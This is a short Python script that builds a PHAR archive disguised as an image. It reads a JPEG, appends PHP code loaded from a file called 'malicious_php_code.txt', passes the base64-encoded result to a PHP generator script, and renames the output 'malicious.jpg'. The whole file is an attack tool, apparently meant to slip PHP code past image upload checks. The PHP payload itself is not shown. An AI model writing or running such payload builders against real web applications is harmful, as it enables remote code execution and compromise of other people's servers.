import os
import base64
import sys
import subprocess

from pathlib import Path

with open('iphone.jpeg', 'rb') as f:
    picture_data = f.read()

malicious_payload_data = Path('malicious_php_code.txt').read_text().encode()

phar_payload = base64.b64encode(picture_data + malicious_payload_data).decode()

# execute the php script to generate the phar archive
bash_command = "php phar_generator.php " + phar_payload

process = subprocess.Popen(bash_command.split(), stdout=subprocess.PIPE)

output, error = process.communicate()

if output != b'[+] File created\n':
    print('[-] An error occured while creating the file')

os.rename('./payload.phar', './malicious.jpg')
